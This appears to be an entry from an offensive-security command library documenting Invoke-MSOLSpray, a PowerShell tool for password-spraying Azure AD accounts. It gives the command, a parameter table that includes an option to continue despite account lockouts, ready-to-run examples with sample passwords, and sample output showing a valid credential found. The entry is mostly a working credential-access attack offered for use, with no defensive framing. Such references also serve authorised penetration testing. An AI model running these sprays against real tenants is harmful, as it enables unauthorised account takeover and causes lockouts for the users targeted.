---
id: f0a584c4-d9df-4b1c-94a5-aa0e9a6dfbcf
name: invoke-mso-lspray-password-spray
type: command
executor: powershell
data: Invoke-MSOLSpray -UserList $_USERLIST -Password $_PASSWORD -Verbose
output: null
created_at: '2023-05-23T16:38:53.036383+00:00'
updated_at: '2023-05-23T16:38:53.084754+00:00'
platforms:
  - Windows
  - Linux
tags:
  - attack
  - credential-access
  - powershell
verified: true
validated: true
---

# invoke-mso-lspray-password-spray

## Command

```powershell
Invoke-MSOLSpray -UserList $_USERLIST -Password $_PASSWORD -Verbose
```

## Description

This command performs a password spray attack against Azure AD using MSOLSpray, testing a single password against a list of users.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -UserList $_USERLIST | Path to text file with usernames (one per line) | Yes |
| -Password $_PASSWORD | Single password to spray | Yes |
| -Verbose | Enable detailed logging | No |
| -Force | Continue despite lockouts | No |
| -URL | Custom Azure AD login URL | No |

## Examples

### Basic Usage

```powershell
Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020 -Verbose
```

### With Force Option

```powershell
Invoke-MSOLSpray -UserList .\users.txt -Password d0ntSprayme! -Force
```

## Expected Output

[*] Testing Winter2020 against user1@domain.com... Failed
[*] Testing Winter2020 against user2@domain.com... Success! Valid: user2@domain.com:Winter2020

## Related

- [[procedures/Azure-AD-Password-Spray]]
